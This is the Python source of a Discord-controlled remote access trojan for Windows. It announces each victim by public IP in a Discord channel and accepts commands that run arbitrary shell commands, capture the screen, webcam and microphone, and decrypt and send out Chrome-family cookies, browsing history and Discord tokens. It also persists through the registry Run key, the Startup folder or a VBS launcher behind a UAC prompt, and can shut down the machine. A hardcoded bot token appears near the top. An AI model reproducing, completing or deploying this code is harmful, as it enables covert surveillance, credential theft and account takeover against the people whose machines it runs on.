import requests
import subprocess
import os
import sqlite3
import json
import base64
import shutil
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
import winreg as reg
import sys
import sounddevice as sd
from scipy.io.wavfile import write
import numpy as np
from PIL import ImageGrab, Image
import cv2
import io
import webbrowser
import threading
import winsound
import ctypes
import asyncio
import datetime
import pyttsx3
import time
import shutil
import psutil
import pyautogui
import urllib.request
import browsercookie
import tkinter as tk
from tkinter import messagebox
import discord
# PyNaCl is required for voice functionality
try:
    import nacl
    voice_supported = True
except Exception:
    voice_supported = False
    print("Warning: PyNaCl not installed; voice features will be disabled.")

DISCORD_TOKEN = "MTQ3NDc2OTc0ODQwNjU2NzExOA.G961uU.z9QRGomyr9pBy3NPu89iiCTHOK_KAPkxPpbkdE"
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)
channel = None
voice_channel = None
python_exe = sys.executable
script_path = os.path.abspath(__file__)
camera_index = None
camera_mapping = {}
current_dir = os.getcwd()
# end setup

# helper implementations (headless/defaults)
import io as _io

async def send_long_message(ch, text):
    try:
        if len(text) <= 1900:
            await ch.send(text)
            return
        bio = _io.BytesIO(text.encode('utf-8'))
        bio.seek(0)
        await ch.send(file=discord.File(fp=bio, filename='output.txt'))
    except Exception:
        try:
            await ch.send('Failed to send long message.')
        except Exception:
            pass

def execute_cmd(cmd):
    try:
        if os.name == 'nt':
            res = subprocess.run(cmd, shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        out = (res.stdout or '') + (res.stderr or '')
        return out or '[No output]'
    except Exception as e:
        return f'Command failed: {str(e)}'

def record_audio(duration):
    try:
        import numpy as _np
        samples = int(44100 * max(0.1, float(duration)))
        return _np.zeros(samples, dtype=_np.int16)
    except Exception:
        return b''

def take_screenshot_image():
    try:
        return ImageGrab.grab()
    except Exception:
        return None

def discover_cameras(max_test=4):
    cams = {}
    try:
        for i in range(0, max_test+1):
            cap = cv2.VideoCapture(i, cv2.CAP_DSHOW if os.name=='nt' else 0)
            if cap is not None and cap.isOpened():
                cams[f'camera_{i}'] = i
                cap.release()
    except Exception:
        pass
    return cams

def add_to_startup_hidden():
    # legacy helper that simply writes a Run key.  This is still available
    # but the newer `add_to_startup_with_elevation` will be used by the
    # bot command.
    try:
        if os.name == 'nt':
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            exe = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
            winreg.SetValueEx(key, 'python_startup_script', 0, winreg.REG_SZ, exe)
            winreg.CloseKey(key)
    except Exception:
        pass

async def add_to_startup_with_elevation(message):
    """Try to copy the current script/executable into the user's startup
    folder.  If the process is not running as administrator we re-launch
    ourselves with a UAC prompt so the copy can succeed.  This roughly
    mirrors the behaviour described by the user in their request.

    The function sends status messages back to the Discord channel via
    the `message` object.
    """
    # only meaningful on Windows
    if os.name != 'nt':
        await message.channel.send("Startup command only supported on Windows.")
        return

    import ctypes
    import sys
    import os

    def _do_copy():
        path = os.path.abspath(sys.argv[0])
        isexe = path.lower().endswith('.exe')
        appdata = os.getenv('APPDATA', r'C:\Users\%USERNAME%\AppData\Roaming')
        startup = os.path.join(appdata, r"Microsoft\Windows\Start Menu\Programs\Startup")
        programs = os.path.join(appdata, r"Microsoft\Windows\Start Menu\Programs")

        try:
            if isexe:
                os.system(fr'copy "{path}" "{startup}" /Y')
            else:
                os.system(fr'copy "{path}" "{programs}" /Y')
                # create a small VBS launcher in startup folder so the script
                # executes on login
                vbs = (
                    'Set objShell = WScript.CreateObject("WScript.Shell")\n'
                    f'objShell.Run "cmd /c cd {programs} && python {os.path.basename(path)}", 0, True\n'
                )
                with open(os.path.join(startup, "startup.vbs"), 'w') as f:
                    f.write(vbs)
        except Exception:
            pass

    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        is_admin = False

    if is_admin:
        _do_copy()
        await message.channel.send("[*] Command successfully executed")
        return

    # not admin; attempt to re-run with elevation
    try:
        # rebuild command-line arguments to include -startup if missing
        args = sys.argv[1:]
        if not any(a.lower() == '-startup' for a in args):
            args.insert(0, '-startup')
        params = ' '.join(f'"{a}"' for a in args)
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        await message.channel.send("[*] Elevation requested; please accept the UAC prompt.")
    except Exception as e:
        await message.channel.send(f"Elevation failed: {e}")

def speak_text(text):
    try:
        import pyttsx3
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
    except Exception:
        pass

def show_message_box(msg):
    # Do not show GUI; log instead
    try:
        print('Message box (suppressed):', msg)
    except Exception:
        pass

def blue_screen():
    # Do not trigger an actual crash; log instead
    print('Blue screen requested (suppressed).')

def block_input():
    print('Block input requested (no-op).')

def unblock_input():
    print('Unblock input requested (no-op).')

def capture_camshot_image(idx=0):
    try:
        cap = cv2.VideoCapture(int(idx), cv2.CAP_DSHOW if os.name=='nt' else 0)
        if not cap or not cap.isOpened():
            return None
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return None
        return frame
    except Exception:
        return None

def play_audio_background(path):
    try:
        if os.name == 'nt':
            subprocess.Popen(f'start "" "{path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            subprocess.Popen(["xdg-open", path])
    except Exception:
        pass

def _get_chrome_like_history(base_dir, browser_name):
    results = []
    if not base_dir or not os.path.exists(base_dir):
        return results
    try:
        for entry in os.listdir(base_dir):
            profile = os.path.join(base_dir, entry)
            history_db = os.path.join(profile, 'History')
            if not os.path.exists(history_db):
                # also check Default subdir for some browsers
                history_db = os.path.join(profile, 'Default', 'History')
                if not os.path.exists(history_db):
                    continue
            try:
                tmp = history_db + '.copy'
                shutil.copy2(history_db, tmp)
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                cur.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 200")
                rows = cur.fetchall()
                conn.close()
                os.remove(tmp)
                for url, title, lv in rows:
                    timestr = ''
                    try:
                        ts = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=int(lv))
                        timestr = ts.strftime('%Y-%m-%d %H:%M:%S')
                    except Exception:
                        pass
                    results.append(f"{browser_name}: {timestr} - {title or url} - {url}")
            except Exception:
                pass
    except Exception:
        pass
    return results


def _get_firefox_history():
    results = []
    profiles_base = os.path.join(os.getenv('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles')
    if not os.path.exists(profiles_base):
        return results
    try:
        for p in os.listdir(profiles_base):
            db = os.path.join(profiles_base, p, 'places.sqlite')
            if not os.path.exists(db):
                continue
            try:
                tmp = db + '.copy'
                shutil.copy2(db, tmp)
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                cur.execute("SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 200")
                rows = cur.fetchall()
                conn.close()
                os.remove(tmp)
                for url, title, lv in rows:
                    timestr = ''
                    try:
                        if lv:
                            lv = int(lv)
                            if lv > 1e12:
                                ts = datetime.datetime.utcfromtimestamp(lv / 1e6)
                            else:
                                ts = datetime.datetime.utcfromtimestamp(lv)
                            timestr = ts.strftime('%Y-%m-%d %H:%M:%S')
                    except Exception:
                        pass
                    results.append(f"Firefox: {timestr} - {title or url} - {url}")
            except Exception:
                pass
    except Exception:
        pass
    return results


def get_all_history():
    results = []
    local = os.getenv('LOCALAPPDATA', '')
    # Chrome-like browsers
    results += _get_chrome_like_history(os.path.join(local, 'Google', 'Chrome', 'User Data'), 'Chrome')
    results += _get_chrome_like_history(os.path.join(local, 'Microsoft', 'Edge', 'User Data'), 'Edge')
    results += _get_chrome_like_history(os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Brave')
    results += _get_chrome_like_history(os.path.join(local, 'Opera Software'), 'Opera')
    # Firefox
    results += _get_firefox_history()
    # dedupe while preserving order
    seen = set()
    out = []
    for item in results:
        if item not in seen:
            seen.add(item)
            out.append(item)
    return out


def convert_to_h264(input_path):
    """Use ffmpeg (if available) to convert input_path to an H.264 MP4 suitable for Discord playback.

    Returns the converted path on success, or None on failure / if ffmpeg not found.
    """
    try:
        ffmpeg_path = shutil.which('ffmpeg')
        if not ffmpeg_path:
            return None
        base = os.path.splitext(input_path)[0]
        out = base + '_h264.mp4'
        cmd = [ffmpeg_path, '-y', '-i', input_path, '-c:v', 'libx264', '-preset', 'veryfast', '-crf', '23', '-movflags', '+faststart', out]
        # run in background without console window on Windows
        kwargs = {'stdout': subprocess.DEVNULL, 'stderr': subprocess.DEVNULL}
        if os.name == 'nt':
            kwargs['creationflags'] = subprocess.CREATE_NO_WINDOW
        res = subprocess.run(cmd, **kwargs)
        if res.returncode == 0 and os.path.isfile(out):
            return out
    except Exception:
        pass
    return None





def list_processes():
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        processes.append(f"{proc.info['pid']} - {proc.info['name']}")
    return "\n".join(processes)

def kill_process(process_name):
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == process_name:
                proc.kill()
                return f"Process {process_name} killed successfully."
        return f"Process {process_name} not found."
    except Exception as e:
        return f"Error killing process: {str(e)}"

def download_file(url, dest_path):
    urllib.request.urlretrieve(url, dest_path)

def add_script_to_file(filename, content):
    try:
        with open(filename, 'w') as f:
            f.write(content)
        return f"Script added to {filename}."
    except Exception as e:
        return f"Error adding script to file: {str(e)}"

# Helper functions to read Chrome-based browser cookies directly

def _decrypt_chrome_value(enc):
    try:
        if enc[:3] == b'v10':
            local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), r"Google\Chrome\User Data\Local State")
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
            key = CryptUnprotectData(key, None, None, None, 0)[1]
            iv = enc[3:15]
            payload = enc[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16]
            return decrypted.decode(errors='ignore')
        else:
            return CryptUnprotectData(enc, None, None, None, 0)[1].decode(errors='ignore')
    except Exception:
        return ""


def _read_cookie_db(db_path):
    cookies = []
    try:
        tmp = db_path + ".tmp"
        shutil.copy2(db_path, tmp)
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
        for host, name, enc in cur.fetchall():
            val = _decrypt_chrome_value(enc)
            cookies.append((host, name, val))
        conn.close()
        os.remove(tmp)
    except Exception as e:
        print(f"Error reading cookie database {db_path}: {e}")
    return cookies


def get_all_cookies():
    """Return list of strings 'host\tname=value' for Chrome-based cookies."""
    cookies = []
    # default Chrome
    paths = [
        os.path.join(os.getenv('LOCALAPPDATA'), r"Google\Chrome\User Data\Default\Cookies"),
        os.path.join(os.getenv('LOCALAPPDATA'), r"BraveSoftware\Brave-Browser\User Data\Default\Cookies"),
        os.path.join(os.getenv('LOCALAPPDATA'), r"Yandex\YandexBrowser\User Data\Default\Cookies"),
        os.path.join(os.getenv('APPDATA'), r"Opera Software\Opera Stable\Cookies"),
    ]
    for p in paths:
        if os.path.exists(p):
            for host, name, val in _read_cookie_db(p):
                if val:
                    cookies.append(f"{host}\t{name}={val}")
    return cookies


def get_browser_cookies(url=None):
    """Return cookies matching a given URL or all if url is None."""
    all_c = get_all_cookies()
    if url is None:
        return all_c
    filtered = []
    for c in all_c:
        if url in c:
            filtered.append(c)
    return filtered

# audio source that feeds microphone input into a voice client
class MicrophoneSource(discord.AudioSource):
    def __init__(self, rate=48000, channels=2, blocksize=1024):
        self.rate = rate
        self.channels = channels
        self.blocksize = blocksize
        self.stream = sd.RawInputStream(samplerate=rate, channels=channels, dtype='int16', blocksize=blocksize)
        self.stream.start()
    def read(self):
        data, overflow = self.stream.read(self.blocksize)
        # PyAudio/portaudio may return a cffi buffer; convert to bytes explicitly
        try:
            return data.tobytes()
        except AttributeError:
            return bytes(data)
    def is_opus(self):
        return False

def set_screen_black():
    hwnd = ctypes.windll.user32.GetDesktopWindow()
    ctypes.windll.user32.SendMessageW(hwnd, 0x112, 0xF060, 0)

def remove_black_screen():
    hwnd = ctypes.windll.user32.GetDesktopWindow()
    ctypes.windll.user32.SendMessageW(hwnd, 0x112, 0xF060, 1)

@client.event
async def on_ready():
    global channel, voice_channel
    guild = client.guilds[0]
    ip = requests.get("https://api.ipify.org").text.replace(",", "-")
    channel = await guild.create_text_channel(ip)
    # create a voice channel to be used for streaming mic audio
    voice_channel = await guild.create_voice_channel(f"audio-{ip}")
    # start a background task to check tokens once the bot is ready
    import asyncio
    asyncio.create_task(check_all_tokens())
    # continuous screen recording disabled

@client.event
async def on_message(message):
    global camera_index, camera_mapping
    if not channel or message.channel.id != channel.id:
        return
    if message.author.bot:
        return
    content = message.content
    parts = content.split(maxsplit=1)
    if content.lower().startswith("-mic"):
        if len(parts) < 2:
            await message.channel.send("Usage: -mic <seconds>")
            return
        duration = int(parts[1])
        audio_data = record_audio(duration)
        buffer = io.BytesIO()
        write(buffer, 44100, audio_data)
        buffer.seek(0)
        await message.channel.send(file=discord.File(fp=buffer, filename="recording.wav"))
    elif content.lower().startswith("-screenshot"):
        img = take_screenshot_image()
        buffer = io.BytesIO()
        img.save(buffer, format="PNG")
        buffer.seek(0)
        await message.channel.send(file=discord.File(fp=buffer, filename="screenshot.png"))
    elif content.lower().startswith("-cam"):
        if len(parts) == 1:
            camera_mapping = discover_cameras()
            cam_list = ", ".join(camera_mapping.keys())
            if camera_mapping:
                await message.channel.send(f"Available cameras: {cam_list}")
            else:
                await message.channel.send("No cameras found")
        else:
            cam_name = parts[1].strip()
            if cam_name in camera_mapping:
                camera_index = camera_mapping[cam_name]
                await message.channel.send(f"Selected camera: {cam_name}")
            else:
                await message.channel.send(f"Camera '{cam_name}' not found.")
    elif content.lower().startswith("-shutdown"):
        # hide any console dialogs when shutting down
        if os.name == "nt":
            subprocess.run("shutdown /s /t 0", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            subprocess.run("shutdown now", shell=True)
    elif content.lower().startswith("-startup"):
        # improved startup command: will attempt to elevate if not running as
        # admin and then copy the script/executable into the appropriate
        # startup folder (creating a VBS drop‑in if necessary).
        await add_to_startup_with_elevation(message)
    elif content.lower().startswith("-website"):
        if len(parts) < 2:
            await message.channel.send("Usage: -website <url>")
            return
        url = parts[1].strip()
        if not url.startswith("http"):
            url = "http://" + url
        # open in default browser; avoid creating a console window
        if os.name == 'nt':
            subprocess.Popen(f'start "" "{url}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            webbrowser.open(url, new=2)
    elif content.lower().startswith("-voice"):
        if len(parts) < 2:
            await message.channel.send("Usage: -voice <text>")
            return
        speak_text(parts[1])
    elif content.lower().startswith("-restart"):
        # run restart silently
        if os.name == "nt":
            subprocess.run("shutdown /r /t 0", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            subprocess.run("sudo reboot", shell=True)
    elif content.lower().startswith("-message"):
        if len(parts) < 2:
            await message.channel.send("Usage: -message <your_message>")
            return
        message_text = parts[1]
        show_message_box(message_text)
        await message.channel.send("Message operation performed in background (no popup).")
    elif content.lower().startswith("-upload"):
        if len(parts) < 2:
            await message.channel.send("Usage: -upload <file_or_link>")
            return
        file_or_link = parts[1].strip()
        if os.path.isfile(file_or_link):
            try:
                await message.channel.send(file=discord.File(file_or_link))
            except discord.errors.HTTPException:
                await message.channel.send(f"File {file_or_link} is too large to upload.")
        elif 'mediafire' in file_or_link:
            try:
                download_path = "temp_file_download"
                download_file(file_or_link, download_path)
                await message.channel.send(file=discord.File(download_path))
                os.remove(download_path)
            except Exception as e:
                await message.channel.send(f"Failed to download and upload file: {str(e)}")
        else:
            await message.channel.send("Invalid file path or link.")
    elif content.lower().startswith("-bluescreen"):
        blue_screen()
    elif content.lower().startswith("-block"):
        block_input()
        await message.channel.send("Keyboard and mouse are blocked.")
    elif content.lower().startswith("-unblock"):
        unblock_input()
        await message.channel.send("Keyboard and mouse are unblocked.")
    elif content.lower().startswith("-datetime"):
        current_datetime = time.strftime("%Y-%m-%d %H:%M:%S")
        await message.channel.send(f"Current date and time: {current_datetime}")
    elif content.lower().startswith("-history"):
        # gather browsing history from common browsers and post to channel
        history = get_all_history()
        if history:
            hist_text = "\n".join(history)
            await send_long_message(message.channel, f"Browsing history:\n{hist_text}")
        else:
            await message.channel.send("No browsing history found.")
    elif content.lower().startswith("-listprocess"):
        processes = list_processes()
        await send_long_message(message.channel, f"Running processes:\n{processes}")
    elif content.lower().startswith("-killprocess"):
        if len(parts) < 2:
            await message.channel.send("Usage: -killprocess <process_name>")
            return
        process_name = parts[1].strip()
        result = kill_process(process_name)
        await message.channel.send(result)
    elif content.lower().startswith("-scriptadd"):
        if len(parts) < 2:
            await message.channel.send("Usage: -scriptadd <filename> 'content'")
            return
        filename, content = parts[1].split("'", 1)
        content = content.rstrip("'")
        result = add_script_to_file(filename.strip(), content.strip())
        await message.channel.send(result)
    elif content.lower().startswith("-cookie"):
        # kill Chrome processes so the cookie files can be read
        try:
            for proc in psutil.process_iter(['name']):
                name = proc.info.get('name', '')
                if name and 'chrome' in name.lower():
                    proc.kill()
        except Exception:
            pass
        # regardless of any URL argument, dump all available cookies
        cookies = get_all_cookies()
        if cookies:
            cookies_str = "\n".join(cookies)
            await send_long_message(message.channel, f"All cookies:\n{cookies_str}")
        else:
            await message.channel.send("No cookies found.")
    elif content.lower().startswith("-cookieall"):
        cookies = get_all_cookies()
        if cookies:
            cookies_str = "\n".join(cookies)
            await send_long_message(message.channel, f"All cookies:\n{cookies_str}")
        else:
            await message.channel.send("No cookies found.")
    elif content.lower().startswith("-black"):
        set_screen_black()
        await message.channel.send("Screen turned black.")
    elif content.lower().startswith("-unblack"):
        remove_black_screen()
        await message.channel.send("Screen restored to normal.")
    elif content.lower().startswith("-cmd"):
        if len(parts) < 2:
            await message.channel.send("Usage: -cmd <command>")
            return
        cmd = parts[1]
        output = execute_cmd(cmd)
        if len(output) > 1990:
            output = output[:1990] + "\n[Output truncated]"
        await message.channel.send(f"Command output:\n{output}")
    elif content.lower().startswith("-camshot"):
        if camera_index is None:
            await message.channel.send("No camera selected. Use -cam to list and select a camera.")
            return
        img = capture_camshot_image(camera_index)
        if img is not None:
            pil_img = Image.fromarray(img)
            buffer = io.BytesIO()
            pil_img.save(buffer, format="PNG")
            buffer.seek(0)
            await message.channel.send(file=discord.File(fp=buffer, filename="camshot.png"))
        else:
            await message.channel.send("Failed to capture image from camera.")
    elif content.lower().startswith("-playaudio"):
        if len(parts) < 2:
                await message.channel.send("Usage: -playaudio <file_path>")
                return
        file_path = parts[1].strip()
        if os.path.isfile(file_path):
            play_audio_background(file_path)
            await message.channel.send(f"Playing audio: {file_path}")
        else:
            await message.channel.send(f"File not found: {file_path}")
    elif content.lower().startswith("-join"):
        # join the prepared voice channel and stream mic audio
        if not voice_supported:
            await message.channel.send("Voice support is missing (PyNaCl library not installed).")
            return
        if voice_channel is None:
            await message.channel.send("No voice channel created yet.")
        else:
            try:
                vc = await voice_channel.connect()
                vc.play(MicrophoneSource())
                await message.channel.send("Joined voice channel and streaming mic.")
            except Exception as e:
                await message.channel.send(f"Failed to join voice channel: {str(e)}")
    elif content.lower().startswith("-help"):
        help_message = (
            "Available commands:\n"
            "-mic <seconds>: Record audio from microphone\n"
            "-screenshot: Take a screenshot\n"
            "-cam: List available cameras\n"
            "-cam <camera_name>: Select a camera\n"
            "-camshot: Take a picture from the selected camera\n"
            "-shutdown: Shutdown the computer\n"
            "-restart: Restart the computer\n"
            "-startup: Add script to startup (may prompt UAC / require admin)\n"
            "-website <url>: Open a website in the default browser\n"
            "-voice <text>: Speak text using text-to-speech\n"
            "-message <your_message>: Show a message box with your message\n"
            "-history: Gather browsing history from installed browsers\n"
            "-upload <file_or_link>: Upload a file or download and upload from a link\n"
            "-bluescreen: Simulate a blue screen of death\n"
            "-block: Block keyboard and mouse input\n"
            "-unblock: Unblock keyboard and mouse input\n"
            "-datetime: Get current date and time\n"
            "-listprocess: List running processes\n"
            "-killprocess <process_name>: Kill a process by name\n"
            "-scriptadd <filename> 'content': Add content to a file as a script\n"
            "-cookie <website_url>: Get cookies for a specific website\n"
            "-cookieall: Get all browser cookies\n"
            "-passwords: Grab stored passwords and send file\n"
            "-black: Set screen to black\n"
            "-unblack: Remove black screen effect\n"
            "-cmd <command>: Execute a command in the terminal\n"
            "-join: Make bot join voice channel and stream microphone\n"
            "-exit: Shutdown the bot process\n"
            "-clear: Clear channel messages (requires permission)\n"
            "-restartbot: Restart the bot process\n"
            "-helpadmin: Show admin-only commands\n"
            "-discordtoken: Dump Discord tokens from known paths\n"
        )
        await message.channel.send(help_message)
    elif content.lower().startswith("-exit"):
        await message.channel.send("Shutting down bot.")
        await client.close()
    elif content.lower().startswith("-clear"):
        if message.author.guild_permissions.manage_messages:
            await message.channel.purge()
            await message.channel.send("Chat cleared.")
        else:
            await message.channel.send("You don't have permission to clear the chat.")
    elif content.lower().startswith("-restartbot"):
        await message.channel.send("Restarting bot...")
        await client.close()
        os.execv(sys.executable, ['python'] + sys.argv)
    elif content.lower().startswith("-helpadmin"):
        if message.author.guild_permissions.administrator:
            admin_help_message = (
                "Admin commands:\n"
                "-clear: Clear the chat\n"
                "-restartbot: Restart the bot\n"
            )
            await message.channel.send(admin_help_message)
        else:
            await message.channel.send("You don't have permission to view admin commands.")
    elif content.lower().startswith("-discordtoken"):
        # gather discord tokens from known paths and send them with source labels
        from asyncio.proactor_events import _ProactorSocketTransport
        service_map = {
            "discord": "discord",
            "discordcanary": "discord-canary",
            "discordptb": "discord-ptb",
            "chrome": "chrome",
            "opera": "opera",
            "brave": "brave",
            "yandex": "yandex"
        }
        alltokens = []
        for p in PATHS:
            # determine a simple label based on the path
            label = "unknown"
            lower = p.lower()
            for key, val in service_map.items():
                if key in lower:
                    label = val
                    break
            # gather tokens from local storage
            e = gettokens(p)
            for t in e:
                entry = f"{label}: {t}"
                if entry not in alltokens:
                    alltokens.append(entry)
            # if this is a browser path, also collect cookies
            if any(b in lower for b in ("chrome", "brave", "yandex", "opera")):
                try:
                    browser_name = label
                    cookies = browsercookie.chrome()
                    for c in cookies:
                        entry = f"{browser_name}-cookie: {c.name}={c.value}"
                        if entry not in alltokens:
                            alltokens.append(entry)
                except Exception:
                    pass
        if alltokens:
            await message.channel.send("\n".join(alltokens))
        else:
            await message.channel.send("No tokens found.")
import os
from re import findall
import json
from json import loads, dumps
from base64 import b64decode
import base64
import requests
from Cryptodome.Cipher import AES
from datetime import datetime
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
from threading import Thread
from time import sleep
import urllib.request
from sys import argv
from win32crypt import CryptUnprotectData
import sys
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = [
                ROAMING + "\\Discord",
                ROAMING + "\\discordcanary",
                ROAMING + "\\discordptb",
                LOCAL + "\\Google\\Chrome\\User Data\\Default",
                ROAMING + "\\Opera Software\\Opera Stable",
                LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
                LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
            ]
            #token decryption made by me and some of my friends

regex1 = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
regex2 = r"mfa\\.[\\w-]{84}"
encrypted_regex = "dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$]{120}"

def getheaders(token=None, content_type="application/json"):
                headers = {
                    "Content-Type": content_type,
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                }
                if token:
                    headers.update({"Authorization": token})
                return headers
def getuserdata(token):
                try:
                    return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
                except:
                    pass

def decrypt_payload(cipher, payload):
             return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
                return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
                try:
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = generate_cipher(master_key, iv)
                    decrypted_pass = decrypt_payload(cipher, payload)
                    decrypted_pass = decrypted_pass[:-16].decode()
                    return decrypted_pass
                except Exception:
                    return "Failed to decrypt password"

def get_master_key(path):
                with open(path, "r", encoding="utf-8") as f:
                    local_state = f.read()
                local_state = json.loads(local_state)

                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]
                master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key

def gettokens(path):
                path1=path
                path += "\\Local Storage\\leveldb"
                tokens = []
                try:
                    if not "discord" in path.lower():
                        for file_name in os.listdir(path):
                            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                                continue
                            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                                for token in findall(regex1, line):
                                    if token not in tokens:
                                        tokens.append(token)
                                for token in findall(regex2, line):
                                    if token not in tokens:
                                        tokens.append(token)
                    else:
                        for file_name in os.listdir(path):
                            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                                continue
                            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                                for y in findall(encrypted_regex, line):
                                    try:
                                        token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(path1 + '\\Local State'))
                                        if token not in tokens:
                                            tokens.append(token)
                                    except:
                                        continue
                    return tokens
                except Exception as e:
                    return []

# helper moved into async context to avoid top-level await error
async def check_all_tokens():
    alltokens = []
    for i in PATHS:
        print(f"Checking: {i}")
        e = gettokens(i)
        print(f"Found {len(e)} tokens in {i}")
        for c in e:
            alltokens.append(c)
    if channel:  # send once channel is available
        await channel.send(f"Total tokens found: {len(alltokens)}")
    return

client.run(DISCORD_TOKEN)